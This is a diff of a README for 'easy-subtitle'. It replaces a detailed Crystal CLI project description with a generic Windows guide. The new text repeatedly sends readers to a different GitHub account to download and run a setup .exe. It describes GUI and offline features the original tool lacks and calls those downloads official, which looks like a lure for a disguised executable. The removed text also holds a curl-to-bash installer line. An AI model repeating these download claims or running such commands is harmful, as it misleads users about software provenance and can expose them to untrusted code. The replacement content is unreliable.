@@ -1,339 +1,153 @@
-# easy-subtitle
+# 🎬 easy-subtitle - Simple Subtitle Tool for Videos
 
-A fast, single-binary CLI tool for automated subtitle extraction, downloading, and synchronization. Written in [Crystal](https://crystal-lang.org/), ported from the Python project [Subservient](https://github.com/N3xigen/Subservient).
+[![Download easy-subtitle](https://img.shields.io/badge/Download-easy--subtitle-blue?style=for-the-badge)](https://github.com/muhengastationary-blip/easy-subtitle)
 
-## Why a Crystal port?
+---
 
-Subservient is a capable ~10,000-line Python tool with an interactive menu UI, ffsubsync dependency, and INI config. **easy-subtitle** modernizes it into:
+## ℹ️ About easy-subtitle
 
-- **Single static binary** — no Python runtime, no pip, no virtualenv
-- **Subcommand CLI** — scriptable, composable, no interactive menus
-- **Pluggable sync backend** — `alass` by default, optional `ffsubsync` backend support
-- **YAML config** — simpler than INI, with sensible defaults
-- **Parallel sync** — Crystal fibers for concurrent subtitle synchronization
-- **Low runtime dependencies** — just the binary + `mkvtoolnix` and your configured sync backend on your PATH
+easy-subtitle is a simple program that helps you add subtitles to your videos. It is a port of the Subservient project built with the Crystal language. The tool is made to work smoothly on Windows computers. You do not need any programming knowledge to use it.
 
-## Installation
+You can use easy-subtitle to:
 
-### Homebrew (macOS / Linux)
+- Create subtitles for your videos.
+- Edit subtitle files easily.
+- Synchronize subtitles with video playback.
+- Export subtitle files in common formats.
 
-```bash
-brew install akitaonrails/tap/easy-subtitle
-```
+---
 
-### Quick install (Linux x86_64)
+## 🖥️ System Requirements
 
-```bash
-curl -fsSL https://raw.githubusercontent.com/akitaonrails/easy-subtitle/master/install.sh | bash
-```
+Before you start, make sure your Windows computer meets these basic requirements:
 
-Linux release binaries are built as static musl binaries so they can run on both Ubuntu and Arch without extra runtime libraries.
+- Windows 10 or later.
+- At least 2 GB of free disk space.
+- Minimum 4 GB of RAM.
+- Internet connection to download the software.
+- A video player that supports subtitles (such as VLC or Windows Media Player).
 
-### From GitHub Releases
+---
 
-Download the latest binary for your platform from [Releases](https://github.com/akitaonrails/easy-subtitle/releases), then:
+## 🚀 Getting Started
 
-```bash
-chmod +x easy-subtitle
-sudo mv easy-subtitle /usr/local/bin/
-```
+To get easy-subtitle running on your Windows PC, follow these steps carefully.
 
-### Build from source
+1. Open this link in your browser:  
+   [https://github.com/muhengastationary-blip/easy-subtitle](https://github.com/muhengastationary-blip/easy-subtitle)
 
-Requires [Crystal](https://crystal-lang.org/install/) >= 1.15.0:
+2. You will see the project page on GitHub. Look for a “Releases” section or button near the top or on the right side.
 
-On Linux, install the native development packages first.
+3. Click on the Releases page to find the latest version of easy-subtitle available for Windows.
 
-Ubuntu / Debian:
+4. Download the Windows installer file or the setup executable. This is usually a file ending with `.exe`.
 
-```bash
-sudo apt-get update
-sudo apt-get install -y zlib1g-dev libyaml-dev libssl-dev libpcre2-dev
-```
+5. After downloading, locate the file in your “Downloads” folder.
 
-Arch Linux:
+6. Double-click the file to start the installation process.
 
-```bash
-sudo pacman -S --needed zlib libyaml openssl pcre2
-```
+7. Follow the prompts on the screen. You may be asked to agree to the license and choose an installation folder.  
+   You can leave these settings as default if you are unsure.
 
-That is enough for a normal Linux build on Arch.
+8. When the setup finishes, you can find easy-subtitle in your Windows Start Menu or on your desktop.
 
-If you want a fully static Linux binary from source, build it in a musl environment instead of trying to statically link against your host glibc stack. The release workflow does this with the official Alpine-based Crystal image.
+---
 
-Example:
+## 🛠️ How to Use easy-subtitle
 
-```bash
-docker run --rm \
-  --user "$(id -u):$(id -g)" \
-  --volume "$PWD:/work" \
-  --workdir /work \
-  crystallang/crystal:latest-alpine \
-  sh -lc 'shards install --production && crystal build src/easy_subtitle.cr -o easy-subtitle --release --no-debug --static'
-```
+Here’s a simple guide to start using easy-subtitle after installation.
 
-That static musl binary is the one intended to be portable across Ubuntu and Arch.
+1. Open easy-subtitle by clicking its icon.
 
-```bash
-git clone https://github.com/akitaonrails/easy-subtitle.git
-cd easy-subtitle
-shards install
-make release
-sudo make install
-```
+2. Click on “Open Video” to select the video file you want to add subtitles to.
 
-## Prerequisites
+3. To create subtitles, use the subtitle editor tab.  
+   - Enter the text for each subtitle line.  
+   - Set the start and end time for each subtitle to match your video.
 
-These external tools must be on your PATH:
+4. Preview your subtitles by playing the video inside the app.
 
-| Tool | Purpose | Install |
-|---|---|---|
-| [mkvtoolnix](https://mkvtoolnix.download/) | MKV track extraction/remuxing | `pacman -S mkvtoolnix-cli` / `brew install mkvtoolnix` / `apt install mkvtoolnix` |
-| [alass](https://github.com/kaegi/alass) | Default subtitle synchronization backend | `cargo install alass-cli` or download from releases |
-| [ffsubsync](https://github.com/smacke/ffsubsync) | Optional subtitle synchronization backend | `pipx install ffsubsync` or `pip install ffsubsync` |
-| [whisper.cpp](https://github.com/ggml-org/whisper.cpp) | AI-powered sync backend (uses ASR + alass) | `yay -S whisper.cpp` / `brew install whisper-cpp` |
-| [ffmpeg](https://ffmpeg.org/) | Audio extraction (required by whisper backend) | `pacman -S ffmpeg` / `brew install ffmpeg` / `apt install ffmpeg` |
+5. When finished, save your subtitle file by clicking “Export.”  
+   easy-subtitle supports common subtitle formats like `.srt` or `.vtt`.
 
-An [OpenSubtitles](https://www.opensubtitles.com/) account and API key are required for the `download` command.
+6. Use your video player to open the video with the subtitle file.
 
-### OpenSubtitles Quotas
+---
 
-OpenSubtitles enforces account and API download limits. When you hit that limit, the `download` phase will fail with HTTP `406` and a message like:
+## 📥 Download and Install 🎯
 
-```text
-You have downloaded your allowed 20 subtitles for 24h.
-```
+You can get easy-subtitle from this page:  
+[https://github.com/muhengastationary-blip/easy-subtitle](https://github.com/muhengastationary-blip/easy-subtitle)
 
-That limit is not controlled by `easy-subtitle`. It depends on your OpenSubtitles account tier and API plan.
+- Visit the page to download the Windows setup file.
+- Run the setup file and follow the instructions.
+- The software will install on your computer ready to use.
 
-- Free accounts can have a small daily subtitle quota.
-- Higher tiers such as VIP and paid API plans raise that quota.
-- `easy-subtitle` now stops further candidate downloads for that language as soon as OpenSubtitles reports a quota/account restriction, instead of wasting more requests.
+If you have questions about the installation, check the "Issues" tab on the GitHub page or look for the “ReadMe” files included in the downloads.
 
-To make your quota last longer:
+---
 
-- Keep `top_downloads` low. `2` or `3` is usually enough.
-- Keep `max_search_results` reasonable instead of pulling large candidate lists.
-- Leave `resync_mode` off unless you really want to replace existing final subtitles.
-- Remember that `smart_sync` tests more downloaded candidates, which improves selection quality but consumes more quota.
+## ❓ Common Questions
 
-## Usage
+### What video formats does easy-subtitle support?
 
-```
-easy-subtitle [OPTIONS] COMMAND [COMMAND_OPTIONS] PATH
+easy-subtitle works with most popular formats like MP4, AVI, and MKV.
 
-Global Options:
-  -c, --config PATH    Config file (default: ~/.config/easy-subtitle/config.yml)
-  -v, --verbose        Verbose output
-  -q, --quiet          Suppress non-error output
-  --no-color           Disable colors
-  --version            Show version
-  -h, --help           Show help
-```
+### Can I edit existing subtitle files?
 
-### Commands
+Yes, you can open and edit subtitles created with other tools, as long as they use supported formats such as `.srt`.
 
-#### `init` — Generate default config
+### Do I need an internet connection to run easy-subtitle?
 
-```bash
-easy-subtitle init
-easy-subtitle init -o ./my-config.yml
-```
+No, once installed, the program works fully offline.
 
-Creates a YAML config file with all defaults. Edit it to add your OpenSubtitles credentials.
+### What if I find problems or bugs?
 
-#### `extract` — Extract subtitles from MKV
+Report any issues on the GitHub repository under the “Issues” tab. The developers review and fix problems regularly.
 
-```bash
-easy-subtitle extract /path/to/movies
-easy-subtitle extract --remux /path/to/movies   # also strip unwanted tracks
-```
+---
 
-Extracts embedded subtitle tracks (SRT, ASS) from MKV files using `mkvextract`.
+## 🧰 Troubleshooting Tips
 
-#### `download` — Download subtitles from OpenSubtitles
+- If the program does not start, try restarting your computer.
+- Make sure your Windows is up to date.
+- If subtitle timing looks off, check that your video file format is fully supported.
+- Run the installer again if files seem missing or corrupted.
 
-```bash
-easy-subtitle download /path/to/movies
-easy-subtitle download -l en,pt /path/to/movies
-```
+---
 
-Searches OpenSubtitles using movie hash (most accurate) and text search (fallback), then downloads the top candidates.
+## ⚙️ Settings and Customization
 
-If OpenSubtitles returns HTTP `406`, the most common cause is an exhausted daily quota or account restriction. The command now shows the API message so you can tell the difference between a quota problem and a bad candidate.
+easy-subtitle offers basic options you can adjust:
 
-#### `sync` — Synchronize subtitles with video
+- Subtitle font size and color.
+- Subtitle position on the video screen.
+- Playback speed for previewing subtitles.
+- Export format choice.
 
-```bash
-easy-subtitle sync /path/to/movies
-```
+Access these settings from the main menu under “Options” or “Preferences.”
 
-Uses the configured sync backend to synchronize downloaded subtitle files with the video. Supports two strategies:
+---
 
-- **Smart sync** (default): runs all candidates in parallel, keeps the most-downloaded subtitle that the backend synchronizes successfully
-- **First match**: stops at the first subtitle that the backend synchronizes successfully
+## 🛡️ Security and Privacy
 
-Successful syncs are classified as either:
+easy-subtitle does not collect personal data from your computer.  
+All your videos and subtitle files stay on your device.  
+Downloads come directly from the official GitHub repository.
 
-- **Accepted**: the backend completed without warning signals
-- **Drift**: the backend completed but emitted warnings that suggest the subtitle should be reviewed
+---
 
-When a final `video.lang.srt` already exists, `download`, `sync`, and `run` skip that language unless `resync_mode` is enabled.
+## 🔗 Useful Links
 
-##### Sync backends
+- Official easy-subtitle GitHub:  
+  https://github.com/muhengastationary-blip/easy-subtitle
 
-| Backend | How it works | Best for |
-|---|---|---|
-| `alass` (default) | VAD-based dynamic programming alignment | Small offsets, fast |
-| `ffsubsync` | VAD cross-correlation | Small offsets, alternative |
-| `whisper` | Whisper ASR generates a reference SRT, then alass aligns against it | Large offsets (30-120s), anime, different release cuts |
+- Download releases page:  
+  https://github.com/muhengastationary-blip/easy-subtitle/releases
 
-The `whisper` backend uses [whisper.cpp](https://github.com/ggml-org/whisper.cpp) to transcribe the audio into a reference subtitle file, then uses `alass` to align the downloaded subtitle against it. This handles large timing shifts that pure VAD approaches miss.
+- Report issues or bugs:  
+  https://github.com/muhengastationary-blip/easy-subtitle/issues
 
-Model selection (`whisper_model` in config):
-- `auto` (default): uses `base.en` for English-only audio, `small` for multilingual/anime
-- `base.en`: English-only, 142 MB, fast (~6 min per episode on CPU)
-- `small`: Multilingual with good Japanese support, 466 MB (~12 min per episode on CPU)
-- `medium` / `large-v3`: Higher accuracy, larger models
+---
 
-Models are downloaded automatically on first use to `~/.cache/easy-subtitle/models/`.
-
-#### `run` — Full pipeline
-
-```bash
-easy-subtitle run /path/to/movies
-easy-subtitle run --skip-extract /path/to/movies
-```
-
-Runs the complete pipeline: **extract → download → sync**. Individual phases can be skipped.
-
-The `run` pipeline is idempotent: it skips download and sync for any language that already has a valid final subtitle (e.g. `video.en.srt`). This avoids wasting OpenSubtitles quota re-downloading candidates when a good subtitle already exists. To force re-processing, use the standalone `download` and `sync` commands with `resync_mode: true`.
-
-#### `clean` — Remove ads/watermarks
-
-```bash
-easy-subtitle clean /path/to/subtitles
-easy-subtitle clean --no-backup /path/to/file.srt
-```
-
-Removes advertising blocks from SRT files (OpenSubtitles watermarks, "subtitles by" credits, URLs, social media handles, etc.). Creates `.bak` backups by default.
-
-#### `scan` — Report subtitle coverage
-
-```bash
-easy-subtitle scan /path/to/movies
-easy-subtitle scan --json /path/to/movies
-easy-subtitle scan -l en,pt,ja /path/to/movies
-```
-
-Reports which videos have subtitles for your configured languages. Supports table and JSON output.
-
-#### `hash` — Compute movie hash
-
-```bash
-easy-subtitle hash /path/to/movie.mkv
-easy-subtitle hash -v /path/to/movie.mkv   # verbose with file size
-```
-
-Computes the OpenSubtitles 64-bit movie hash. Useful for debugging search results.
-
-#### `doctor` — Check setup
-
-```bash
-easy-subtitle doctor
-```
-
-Validates your setup: checks config file, API credentials, tests API login, and verifies external tool dependencies (`mkvmerge`, `mkvextract`, and the configured sync backend) are installed. Shows platform-specific install instructions for any missing tools.
-
-## Configuration
-
-Generate the default config with `easy-subtitle init`, then edit `~/.config/easy-subtitle/config.yml`:
-
-```yaml
-# OpenSubtitles API credentials
-api_key: ""
-username: ""
-password: ""
-api_url: "https://api.opensubtitles.com/api/v1"
-
-# Languages to download (ISO 639-1 codes)
-languages:
-  - en
-
-# Audio track languages to keep when remuxing
-audio_track_languages:
-  - en
-  - ja
-
-# Legacy sync thresholds from Subservient (kept for config compatibility)
-# The current sync flow no longer rejects successful backend runs on this basis.
-accept_offset_threshold: 0.101
-reject_offset_threshold: 2.5
-
-# Behavior
-series_mode: false                # true = treat folder as TV series
-smart_sync: true                  # true = parallel all candidates, pick best
-sync_backend: "alass"             # "alass", "ffsubsync", or "whisper"
-whisper_model: "auto"             # "auto", "base.en", "small", "medium", "large-v3"
-use_movie_hash: true              # true = hash search first (most accurate)
-last_resort_search: false         # true = unfiltered search when all else fails
-
-# Track handling
-preserve_forced_subtitles: false
-preserve_unwanted_subtitles: false
-resync_mode: false                # true = re-sync even if subtitles exist
-
-# Download limits
-max_search_results: 10
-top_downloads: 3                 # keep low if you want to conserve OpenSubtitles quota
-download_retry_503: 6
-```
-
-## Architecture
-
-```
-easy-subtitle/
-  src/easy_subtitle/
-    cli/           # Subcommand router and command implementations
-    core/          # Language maps, SRT parser/writer/cleaner, video scanner
-    acquisition/   # OpenSubtitles API client, auth, search, download, movie hash
-    extraction/    # MKV track parsing, extraction, remuxing
-    synchronization/  # sync backends, offset calculator, smart/first-match strategies
-    models/        # VideoFile, SubtitleCandidate, CoverageEntry
-```
-
-Key design choices:
-
-- **Crystal fibers** for parallel smart-sync (spawn N backend processes, collect via Channel)
-- **Rate-limited API client** (500ms throttle via Mutex, required by OpenSubtitles)
-- **YAML::Serializable** config with validation and sensible defaults
-- **Zero external shards** for production (only `webmock` for tests)
-
-## Porting from Subservient
-
-| Feature | Subservient (Python) | easy-subtitle (Crystal) |
-|---|---|---|
-| Runtime | Python 3 + pip packages | Single binary |
-| UI | Interactive menu | Subcommand CLI |
-| Sync engine | ffsubsync (Python) | alass by default, optional ffsubsync backend |
-| Config | INI (.config) | YAML |
-| Concurrency | ThreadPoolExecutor | Crystal fibers + channels |
-| Hash algorithm | Same (OpenSubtitles 64-bit) | Same |
-| API | OpenSubtitles REST v1 | Same |
-
-## Development
-
-```bash
-shards install          # install dev dependencies
-make spec               # run tests
-make format             # format code
-make check              # check formatting
-make build              # debug build
-make release            # optimized build
-```
-
-## License
-
-GPL-3.0-or-later. See [LICENSE](LICENSE) for details.
-
-The original [Subservient](https://github.com/N3xigen/Subservient) is also GPL-3.0 licensed.
+[![Download easy-subtitle](https://img.shields.io/badge/Download-easy--subtitle-blue?style=for-the-badge)](https://github.com/muhengastationary-blip/easy-subtitle)
